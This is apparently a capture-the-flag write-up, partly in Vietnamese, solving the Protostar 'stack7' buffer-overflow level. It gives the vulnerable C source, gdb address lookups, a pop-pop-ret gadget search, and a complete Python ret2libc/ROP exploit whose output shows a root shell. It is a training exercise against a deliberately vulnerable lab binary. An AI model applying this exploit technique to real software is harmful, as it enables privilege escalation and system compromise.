# STACK SEVEN

## About

Stack6 introduces return to .text to gain code execution.

The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.

This level is at /opt/protostar/bin/stack7

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

## Solutions

`STACK SEVEN` giới thiệu về cách chúng ta sử dụng segment .text khi mà địa chỉ bị giới hạn trả về không chỉ còn là stack. Chúng ta sẽ tìm hiểu về các ROPgadget và kỹ thuật khai thác ROP (Return-oriented programming).

Đoạn code sau:

```
  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }
```

if((ret & 0xb0000000) == 0xb0000000)

```
Giả sử ret = 0xb7777777
	     ret & 0xb0000000

	     0xb7777777 
     	   & 0xb0000000
	     __________
             0xb0000000 <-- luôn bằng 0xb0000000
```

Đoạn code này có khả năng chặn mọi địa chỉ trả về mà ta cố ghi đè vào EIP (tất cả bị đưa về `0xb0000000`) nếu như địa chỉ đó nằm trong khoảng từ `0xb0000000` đến `0xbfffffff`.

```
root@protostar:/opt/protostar/bin# gdb -q ./stack7
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) start
Temporary breakpoint 1 at 0x804854b: file stack7/stack7.c, line 28.
Starting program: /opt/protostar/bin/stack7

Temporary breakpoint 1, main (argc=1, argv=0xbffffd54) at stack7/stack7.c:28
28      stack7/stack7.c: No such file or directory.
        in stack7/stack7.c
(gdb) info proc map
process 2088
cmdline = '/opt/protostar/bin/stack7'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack7'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb)
```

Đoạn địa chỉ từ `0xb0000000` đến `0xbfffffff` là vùng bị giới hạn - gần như tất cả các phân vùng của chương trình trừ những gì trong đoạn từ `0x8048000` đến `0x804a000` -> không thể sử dụng trực tiếp ret2libc như `STACK SIX` mà ta sẽ trả về một địa chỉ nào đó trên phân vùng không bị giới hạn rồi mới quay lại ret2libc.

Ở đây mình chọn `.text` với địa chỉ của `gadget` _ `pop pop ret`.

system(), exit(), "/bin/sh".

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
(gdb) find 0xb7e97000, 0xb7fd9000, "/bin/sh"
0xb7fba23f
1 pattern found.
(gdb) x/s 0xb7fba23f
0xb7fba23f:      "KIND in __gen_tempname\""
(gdb)
```

Nó chạy cùng 1 thư viện với `STACK SIX` @@.

```
root@protostar:/opt/protostar/bin# strings -tx /lib/libc-2.11.2.so | grep /bin/sh
 11f3bf /bin/sh             <-- offset của /bin/sh so với địa chỉ bắt đầu của libc
 
 Địa chỉ của '/bin/sh' = Địa chỉ bắt đầu libc + 0x11f3bf
 0xb7fb63bf = 0xb7e97000 + 0x11f3bf
```

Gadget `pop pop ret`.

`root@protostar:/opt/protostar/bin# objdump -d stack7 | grep -a2 pop`

Có 3 vị trí thỏa mãn 0x80485f7, 0x80485c7, 0x8048492. Mình chọn cái này:

```
 80485c0:       72 de                   jb     80485a0 <__libc_csu_init+0x30>
 80485c2:       83 c4 1c                add    $0x1c,%esp
 80485c5:       5b                      pop    %ebx
 80485c6:       5e                      pop    %esi
 80485c7:       5f                      pop    %edi     * Start gadget for me.
 80485c8:       5d                      pop    %ebp
 80485c9:       c3                      ret
```

Payload của chúng ta bây giờ là:

`payload = "A" * 80 + addr_gadget + "AAAA" + "BBBB" + addr_system + addr_exit + addr_shellcode`

File exp.py

```
import struct
pd = "A" * 80
ppr = struct.pack("I", 0x080485c7)
pop1 = "AAAA"
pop2 = "BBBB"
sysadd = struct.pack("I", 0xb7ecffb0)
exitadd = struct.pack("I", 0xb7ec60c0)
binadd = struct.pack("I", 0xb7fb63bf)
payload = pd + ppr + pop1 + pop2 + sysadd + exitadd + binadd
print payload
```

Done!

```
root@protostar:/opt/protostar/bin# (python exp.py; cat) | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAǅAAAAAAAAAAAAǅAAAABBBB`췿c
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
ls
final0	final1	final2	format0  format1  format2  format3  format4  heap0  heap1  heap2  heap3  net0  net1  net2  net3  net4  stack0  stack1  stack2  stack3  stack4  stack5  stack6  stack7
```


## Documents

<https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/>

<https://www.coengoedegebure.com/buffer-overflow-attacks-explained/>

<https://en.wikipedia.org/wiki/Endianness>

<https://bufferoverflows.net/ret2libc-exploitation-example/>

<https://en.wikipedia.org/wiki/Return-oriented_programming>


